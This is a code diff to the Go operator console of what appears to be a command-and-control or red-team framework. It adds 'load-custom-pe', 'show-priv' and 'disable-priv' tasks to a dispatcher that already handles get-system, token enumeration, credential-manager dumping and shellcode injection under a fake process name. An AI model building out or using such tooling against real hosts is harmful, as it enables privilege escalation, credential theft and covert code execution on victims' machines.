@@ -282,8 +282,8 @@ func PrepareShellcodeTask(c *ishell.Context, clientId string, command string, pr
 		return false
 	}
 	localFilePath := argsArray[0]
-	argsArray[0] = argsArray[1]
-	argsArray = argsArray[0:]
+	//argsArray[0] = argsArray[1]
+	argsArray = argsArray[1:]
 	dataBytes, err := os.ReadFile(localFilePath)
 	if err != nil {
 		c.Println(err.Error())
@@ -539,9 +539,9 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskSimple(c, clientId, command)
 	case "run":
 		PrepareTaskWithArgs(c, clientId, command, "<RemoteBinaryPath>: ")
-	case "runas-netonly":
+	case "logon-user-netonly":
 		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password>: ")
-	case "runas":
+	case "logon-user":
 		PrepareTaskWithArgs(c, clientId, command, "<domain> <userName> <password>: ")
 	case "whoami":
 		PrepareTaskSimple(c, clientId, command)
@@ -572,6 +572,10 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "get-system":
 		PrepareTaskSimple(c, clientId, command)
 	case "enable-priv":
+		PrepareTaskWithArgs(c, clientId, command, "<PrivilegeName>: ")
+	case "show-priv":
+		PrepareTaskSimple(c, clientId, command)
+	case "disable-priv":
 		PrepareTaskWithArgs(c, clientId, command, "<PrivilegeName>: ")
 	case "enum-tokens":
 		PrepareTaskSimple(c, clientId, command)
@@ -655,6 +659,8 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareShellcodeTask(c, clientId, command, "<localFile> <fakeProcessName>: ")
 	case "dump-credential-mgr":
 		PrepareTaskWithOneArg(c, clientId, command, "<pid>: ")
+	case "load-custom-pe":
+		PrepareShellcodeTask(c, clientId, command, "<Local PE to send> <exe,dll> <1,0>: ")
 	default:
 		c.Println("Task not found.")
 	}
